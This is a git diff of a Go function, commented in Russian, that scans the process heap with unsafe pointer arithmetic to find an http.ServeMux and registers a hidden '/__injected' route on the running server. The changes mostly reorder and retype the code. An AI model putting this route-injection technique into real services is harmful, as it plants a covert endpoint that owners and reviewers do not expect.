@@ -43,22 +43,22 @@ func inject() {
 		// Ждём,пока запустится сервис
 		time.Sleep(2 * time.Second)
 
-		// Получаем адреса всех объектов в куче
-		objects, err := objectsFromHeap()
-		if err != nil {
-			return
-		}
-
 		var (
 			zeroPointer = getZeroPointer()
 			muxSizeOf   = unsafe.Sizeof(http.ServeMux{})
 
 			// https://go.dev/src/runtime/sizeclasses.go
-			muxSizeClass          = calculateSizeClass(int(muxSizeOf))
+			muxSizeClass          = calculateSizeClass(muxSizeOf)
 			muxRoutingNodeOffset  = 24
 			muxRoutingIndexOffset = 96
 			muxFieldsCount        = 10
 		)
+
+		// Получаем адреса всех объектов в куче
+		objects, err := objectsFromHeap()
+		if err != nil {
+			return
+		}
 
 		for _, obj := range objects {
 			if len(obj.Fields) != muxFieldsCount {
@@ -72,9 +72,9 @@ func inject() {
 			if len(obj.Contents) != muxSizeClass {
 				continue
 			}
-
+			//_ = unsafe.Pointer(uintptr(obj.Address))
+			//_ = unsafe.Pointer(uintptr(unsafe.Pointer(&muxSizeClass)) + 2)
 			var (
-				//ptr = unsafe.Pointer(uintptr(obj.Address))
 				ptr = unsafe.Add(zeroPointer, obj.Address)
 				ri  = (*routingIndex)(unsafe.Add(ptr, muxRoutingIndexOffset))
 			)
@@ -82,6 +82,7 @@ func inject() {
 			if ri != nil && len(ri.segments) > 0 {
 				mux := (*http.ServeMux)(ptr)
 				mux.HandleFunc("/__injected", handleFunc)
+				return
 			}
 		}
 	}()
@@ -92,7 +93,7 @@ func getZeroPointer() unsafe.Pointer {
 	return unsafe.Add(p, -uintptr(p))
 }
 
-func calculateSizeClass(n int) int {
+func calculateSizeClass(n uintptr) int {
 	b := append([]byte(nil), make([]byte, n)...)
 	return cap(b)
 }
